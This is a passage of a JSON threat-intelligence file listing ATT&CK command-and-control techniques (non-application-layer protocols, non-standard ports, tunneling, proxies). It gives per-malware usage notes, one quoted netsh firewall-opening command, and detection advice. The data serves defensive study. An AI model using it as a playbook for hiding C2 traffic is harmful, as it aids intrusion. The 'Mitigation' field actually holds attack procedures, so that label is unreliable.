      {
        "id": "S0220",
        "name": "Chaos",
        "description": "After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.[7]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used multi-stage malware components that inject later stages into separate processes.[8]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.[9]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 can download and execute additional payloads and modules over separate communication channels.[10][11]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Individual Uroburos implants can use multiple communication channels based on one of four available modes of operation.[12]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can download additional modules and malware capable of using separate C2 channels.[13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Non-Application Layer Protocol",
    "Code": "T1095",
    "Description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[1] Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.[2] Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.[3] However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
    "Mitigation": [
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor has used ICMP in C2 communications.[4]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "An APT3 downloader establishes SOCKS5 connections for its initial C2.[5]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has used TCP in C2 communications.[6]"
      },
      {
        "id": "S1029",
        "name": "AuTo Stealer",
        "description": "AuTo Stealer can use TCP to communicate with command and control servers.[7]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.[8]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has a command built in to use a raw TCP socket.[9]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has used raw sockets for network communication.[10]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has used TCP for C2 communications.[11]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has the ability to use TCP for external C2.[12]"
      },
      {
        "id": "S0043",
        "name": "BUBBLEWRAP",
        "description": "BUBBLEWRAP can communicate using SOCKS.[13]"
      },
      {
        "id": "C0021",
        "name": "C0021",
        "description": "During C0021, the threat actors used TCP for some C2 communications.[14]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon uses TCP and UDP for C2.[15]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to use TCP and UDP for communication.[16]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can be configured to use TCP, ICMP, and UDP for C2 communications.[17][18]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson uses a custom TCP protocol for C2.[19][20]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic can use TCP in communications with C2.[21]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.[22]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub can use TCP to communicate between its agent and client modules.[23]"
      },
      {
        "id": "S0076",
        "name": "FakeM",
        "description": "Some variants of FakeM use SSL to communicate with C2 servers.[24]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used Metasploit Bind and Reverse TCP stagers.[25]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can communicate with C2 over TCP and UDP.[26]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium has the ability to use TCP and UDP in C2 communications.[27]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has used an encrypted protocol within TCP segments to communicate with the C2.[28]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has used TCP for C2.[29]"
      },
      {
        "id": "S0394",
        "name": "HiddenWasp",
        "description": "HiddenWasp communicates with a simple network protocol over TCP.[30]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole has used TCP to download additional modules.[31]"
      },
      {
        "id": "S1051",
        "name": "KEYPLUG",
        "description": "KEYPLUG can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.[32]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack uses a custom binary protocol over sockets for C2 communications.[33]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has used a custom JSON-based protocol for its C&C communications.[34]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can use raw TCP for C2.[35]"
      },
      {
        "id": "G1013",
        "name": "Metador",
        "description": "Metador has used TCP for C2.[35]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can establish an indirect and raw TCP socket-based connection to the C2 server.[35][36]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has used raw TCP for C2.[37]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type network traffic can communicate over a raw socket.[38]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat network traffic communicates over a raw socket.[38]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind completes network communication via raw sockets.[39]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic supports WebSocket and TCP-based C2 profiles.[40]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae can use TCP in C2 communications.[41]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[42]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can use TCP in C2 communications.[43][44]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used a custom protocol for command and control.[45]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D has used a custom binary protocol over port 443 for C2 traffic.[46]"
      },
      {
        "id": "S0556",
        "name": "Pay2Key",
        "description": "Pay2Key has sent its public key to the C2 server over TCP.[47]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "The Penquin C2 mechanism is based on TCP and UDP packets.[48][49]"
      },
      {
        "id": "S0158",
        "name": "PHOREAL",
        "description": "PHOREAL communicates via ICMP for C2.[50]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull variants have the ability to communicate with C2 servers using ICMP or TCP.[51]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "The PipeMon communication module can use a custom protocol based on TLS over TCP.[52]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[53]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX can be configured to use raw TCP or UDP for command and control.[54]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability use TCP to send or receive C2 packets.[55]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can use TCP for C2 communication.[56]"
      },
      {
        "id": "S1084",
        "name": "QUIETEXIT",
        "description": "QUIETEXIT can establish a TCP connection as part of its initial connection to the C2.[57]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can use TCP in C2 communications.[41]"
      },
      {
        "id": "S0055",
        "name": "RARSTONE",
        "description": "RARSTONE uses SSL to encrypt its communication with its C2 server.[58]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession has the ability to use TCP and UDP in C2 communications.[16][59]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Some Reaver variants use raw TCP for C2.[60]"
      },
      {
        "id": "S0019",
        "name": "Regin",
        "description": "The Regin malware platform can use ICMP to communicate between infected computers.[61]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec is capable of using ICMP, TCP, and UDP for C2.[62][63]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro uses a custom binary protocol using a type, length, value format over TCP.[64]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal establishes a TCP socket for C2 communication using the API WSASocketW.[65]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.[66]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to communicate with C2 with TCP over port 443.[67]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has used UDP for C2 communications.[68]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has the ability to use TCP sockets to send data and ICMP to ping the C2 server.[69][70]"
      },
      {
        "id": "S1049",
        "name": "SUGARUSH",
        "description": "SUGARUSH has used TCP for C2.[71]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can use TCP for C2 communications.[72]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie can use ICMP to receive information on the destination server.[73]"
      },
      {
        "id": "S0221",
        "name": "Umbreon",
        "description": "Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate.[74]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols.[75]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can communicate with its C2 server via TCP over port 5200.[76]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can use TCP for C2 communications.[77]"
      },
      {
        "id": "S0155",
        "name": "WINDSHIELD",
        "description": "WINDSHIELD C2 traffic can communicate via TCP raw sockets.[50]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications.[78]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows can communicate using custom TCP.[79]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Non-Standard Port",
    "Code": "T1571",
    "Description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088[1] or port 587[2] as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.[3]",
    "Mitigation": [
      {
        "id": "G0099",
        "name": "APT-C-36",
        "description": "APT-C-36 has used port 4050 for C2 communications.[4]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.[5]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used HTTP over TCP ports 808 and 880 for command and control.[1]"
      },
      {
        "id": "S0245",
        "name": "BADCALL",
        "description": "BADCALL communicates on ports 443 and 8000 with a FakeTLS method.[6]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.[7]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear has used a custom RC4 and XOR encrypted protocol over port 443 for C2.[8]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.[9]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.[10]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.[11]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi has used unencrypted HTTP on port 443 for C2.[12]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.[13][14]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.[15]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files.[16]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT has used HTTP over a non-standard port, such as TCP port 46769.[17]"
      },
      {
        "id": "S0246",
        "name": "HARDRAIN",
        "description": "HARDRAIN binds and listens on port 443 with a FakeTLS method.[18]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has connected outbound over TCP port 443 with a FakeTLS method.[19]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.[20][21]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has used TCP port 5633 for C2 Communication.[22]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.[23][24]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has communicated with hosts over raw TCP on port 9999.[25]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.[26]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT has used port 1177 for HTTP C2 communications.[27]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.[28]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D has used a custom binary protocol over TCP port 443 for C2.[29]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can use HTTPS over port 8080 for C2.[30]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT used TLS to encrypt communications over port 143[31]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can use port 4782 on the compromised host for TCP callbacks.[32]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can use HTTP over non-standard ports, such as 995, for C2.[33]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke's miner connects to a C2 server using port 51640.[34]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro uses a custom binary protocol over TCP port 443.[35]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM used Port 44443 for its VNC module.[36]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used port 6789 to accept connections on the group's SSH server.[37]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.[38]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used port 444 when sending data about the system from the client to the server.[39]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity has used HTTPS over port 1402 in C2 communication.[40]"
      },
      {
        "id": "S1049",
        "name": "SUGARUSH",
        "description": "SUGARUSH has used port 4585 for a TCP connection to its C2.[41]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.[42]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "Some TrickBot samples have used HTTP over ports 447 and 8082 for C2.[43][44][45] Newer versions of TrickBot have been known to use a custom communication protocol which sends the data unencrypted over port 443. [46]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "TYPEFRAME has used ports 443, 8080, and 8443 with a FakeTLS method.[47]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.[48][49]"
      },
      {
        "id": "G0090",
        "name": "WIRTE",
        "description": "WIRTE has used HTTPS over ports 2083 and 2087 for C2.[50]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can use ports 1985 and 1986 in HTTP/S communication.[51]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data flows for unexpected patterns and metadata that may be indicative of a mismatch between protocol and utilized port."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Protocol Tunneling",
    "Code": "T1572",
    "Description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.[1] Protocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.[2] Adversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure.",
    "Mitigation": [
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can use DNS over HTTPS for C2.[3][4]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider used SSH tunneling in targeted environments.[5]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.[6]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group has used the Plink utility to create SSH tunnels.[7][8][9]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[10][11]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.[12]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can use DNS over HTTPS (DoH) to resolve C2 nodes.[13]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[14]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.[15]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.[16]"
      },
      {
        "id": "S0173",
        "name": "FLIPSIDE",
        "description": "FLIPSIDE uses RDP to tunnel traffic from a victim environment.[17]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion.[18][19][20]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can connect to HTTP proxies via TCP to create a tunnel to C2.[21]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.[22]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.[23]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can use a custom protocol tunneled through DNS or HTTP.[24]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.[25]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used Plink to tunnel RDP over SSH.[26]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can use a custom protocol tunneled through DNS or HTTP.[24]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic can use SOCKS proxies to tunnel traffic through another protocol.[27]"
      },
      {
        "id": "S0508",
        "name": "ngrok",
        "description": "ngrok can tunnel RDP and other services securely over internet connections.[28][29][30][31]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used the Plink utility and other tools to create tunnels to C2 servers.[32][33][34]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.[35]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS.[36]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Proxy",
    "Code": "T1090",
    "Description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
    "Mitigation": [
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used a tool called CLASSFON to covertly proxy network communications.[2]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to use a reverse SOCKS proxy module.[3]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred can utilize proxy for communications.[4]"
      },
      {
        "id": "S0245",
        "name": "BADCALL",
        "description": "BADCALL functions as a proxy server between the victim and C2 server.[5]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers. BADHATCH can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.[6]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has supported use of a proxy server.[7]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used frp, ssf, and Venom to establish SOCKS proxy connections.[8]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic.[9]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.[10]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can act as a reverse proxy.[11]"
      },
      {
        "id": "G0052",
        "name": "CopyKittens",
        "description": "CopyKittens has used the AirVPN service for operational activity.[12]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.[13][14]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca adopted Cloudflare as a proxy for compromised servers.[15]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.[16][17][18]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can identify and use configured proxies in a compromised network for C2 communication.[19]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can use proxies for C2 traffic.[20][21]"
      },
      {
        "id": "S0246",
        "name": "HARDRAIN",
        "description": "HARDRAIN uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server.[22]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators.[23]"
      },
      {
        "id": "S0040",
        "name": "HTRAN",
        "description": "HTRAN can proxy TCP socket connections to obfuscate command and control infrastructure.[24][25]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can serve as a SOCKS proxy server.[26]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel can use a proxy during exfiltration if set in the configuration.[27]"
      },
      {
        "id": "S1051",
        "name": "KEYPLUG",
        "description": "KEYPLUG has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.[9]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.[28]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims.[29]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic.[30]"
      },
      {
        "id": "G1019",
        "name": "MoustachedBouncer",
        "description": "MoustachedBouncer has used a reverse proxy tool similar to the GitHub repository revsocks.[31]"
      },
      {
        "id": "S0108",
        "name": "netsh",
        "description": "netsh can be used to set up a proxy tunnel to allow remote host access to an infected host.[32]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can implement use of proxies to pivot traffic.[33]"
      },
      {
        "id": "S0508",
        "name": "ngrok",
        "description": "ngrok can be used to proxy connections to machines located behind NAT or firewalls.[34][35]"
      },
      {
        "id": "C0013",
        "name": "Operation Sharpshooter",
        "description": "For Operation Sharpshooter, the threat actors used the ExpressVPN service to hide their location.[36]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops.[37]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to proxy network communications.[38]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used the AirVPN service for operational activity.[12]"
      },
      {
        "id": "S0378",
